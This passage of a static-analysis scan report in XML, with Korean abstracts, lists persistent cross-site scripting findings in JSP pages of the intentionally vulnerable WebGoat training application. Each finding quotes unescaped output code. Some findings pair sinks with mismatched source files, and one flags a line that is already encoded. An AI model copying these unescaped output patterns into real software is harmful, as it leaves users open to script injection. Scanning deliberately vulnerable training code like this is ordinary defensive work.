                        <Issue iid="4E07B8AD5800F0310C4D122C676B24D8" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 86 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>86</LineStart>
<Snippet>						&lt;!-- Encode data that might contain HTML content to protect against XSS --&gt;

						&lt;%=webSession.htmlEncode(employee.getPersonalDescription())%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="C26F569264B75292127994509FFCAB3F" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 47 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>47</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="DA877CBB8DD67E216AD441B1F86BAFA7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 18 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>18</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getFirstName()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>98</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		answer_results.beforeFirst();
		while (answer_results.next())</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="A47E1B753DAC3ACD2C97EA416E79F38E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5C7A387E435F024334D111F75B50759C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionNotes()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="CC0489D601C26ED6FB93BA3D73B84670" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 34 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/EditProfile.jsp</FilePath>
<LineStart>34</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=CrossSiteScripting.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="ED771BEED4BC161EDF63F83817ECA4B7" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F8EDB66D17F0A5DAE8736B09CC1E444A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ListStaff.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ListStaff.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ListStaff.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>					{
						EmployeeStub stub = (EmployeeStub) i.next();%&gt;
						&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName()+ " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;&lt;%
					}%&gt;
  &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="50E51B5F236992EBB2C96C8874B686A1" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/ViewProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;span class="lesson_text_db"&gt;&lt;%=employee.getLastName()%&gt;&lt;/span&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="156070CA1D0935AD75E101D40D23E00B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 89 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>89</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;			
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="5E0E656019DB108E805867EC336A0E94" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 54 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>54</LineStart>
<Snippet>			    	&lt;/TD&gt;
			    	&lt;TD&gt;
			    		&lt;%=employee.getSsn()%&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ViewProfile.java</FilePath>
<LineStart>118</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F011DB07527E3B7F7F3E72C513A9024E" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 46 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>46</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.START_DATE%&gt;" type="text" value="&lt;%=employee.getStartDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2FA62E017393441EE64F54410327AD26" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 28 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>28</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS1%&gt;" type="text" value="&lt;%=employee.getAddress1()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="E666229CA1230C1DC427FE932DF9C74B" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 22 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>22</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
					 	&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.LAST_NAME%&gt;" type="text" value="&lt;%=employee.getLastName()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0E90EA01B8490CF39A4348D5DAEFF50C" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 123 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>123</LineStart>
<Snippet>                       	&lt;td width="81"&gt;
 							&lt;input name="&lt;%=SQLInjection.EMPLOYEE_ID%&gt;" type="hidden" value="&lt;%=employee.getId()%&gt;"&gt;
							&lt;input name="&lt;%=SQLInjection.TITLE%&gt;" type="hidden" value="&lt;%=employee.getTitle()%&gt;"&gt;
							&lt;input type="submit" name="action" value="&lt;%=SQLInjection.UPDATEPROFILE_ACTION%&gt;"/&gt;
						&lt;/td&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="89A1A7861F0D7DF627DB007B748A51F0" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>ViewProfile.jsp의 _jspService() 메서드가 99 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>ViewProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/ViewProfile.jsp</FilePath>
<LineStart>99</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;%=employee.getDisciplinaryActionDate()%&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2AE9EC9782F9927074B612791E70C590" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Login.jsp의 _jspService() 메서드가 25 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>25</LineStart>
<Snippet>						EmployeeStub stub = (EmployeeStub) i.next();
					%&gt;
			      	&lt;option value="&lt;%=Integer.toString(stub.getId())%&gt;"&gt;&lt;%=stub.getFirstName() + " " + stub.getLastName() + " (" + stub.getRole() + ")"%&gt;&lt;/option&gt;
					&lt;%}%&gt;
	                &lt;/select&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>132</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="F2AABC8EB4764466320DE778F4AA5844" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 40 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>40</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.PHONE_NUMBER%&gt;" type="text" value="&lt;%=employee.getPhoneNumber()%&gt;"/&gt;
					&lt;/TD&gt;
					&lt;TD&gt;				</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>97</LineStart>
<Snippet>				ResultSet.CONCUR_READ_ONLY);
		answer_statement.setInt(1, subjectUserId);
		ResultSet answer_results = answer_statement.executeQuery();
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.PreparedStatement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="9E7CF0905FA48123955336CCE2F5F970" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 109 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/EditProfile.jsp</FilePath>
<LineStart>109</LineStart>
<Snippet>					&lt;/TD&gt;
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=SQLInjection.DISCIPLINARY_DATE%&gt;" type="text" value="&lt;%=employee.getDisciplinaryActionDate()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>112</LineStart>
<Snippet>			.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,
				ResultSet.CONCUR_READ_ONLY);
		ResultSet answer_results = answer_statement.executeQuery(query);
		if (answer_results.next())
		{</Snippet>
<TargetFunction>java.sql.Statement.executeQuery()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="7FA91BEA34DDD7F5FF719E884AA9C64A" ruleID="4D69E4E2-959C-4EF8-84F4-A6489B288ABF">
                            <Category>Cross-Site Scripting: Persistent</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>EditProfile.jsp의 _jspService() 메서드가 33 줄의 확인되지 않은 데이터를 웹 브라우저에 보내면 브라우저에서 악성 코드를 실행하는 결과를 초래할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>EditProfile.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/EditProfile.jsp</FilePath>
<LineStart>33</LineStart>
<Snippet>						City/State: 
					&lt;TD&gt;
						&lt;input class="lesson_text_db" name="&lt;%=RoleBasedAccessControl.ADDRESS2%&gt;" type="text" value="&lt;%=employee.getAddress2()%&gt;"/&gt;
					&lt;/TD&gt;
				&lt;/TR&gt;</Snippet>
<TargetFunction>javax.servlet.jsp.JspWriter.print()</TargetFunction>
                            </Primary>
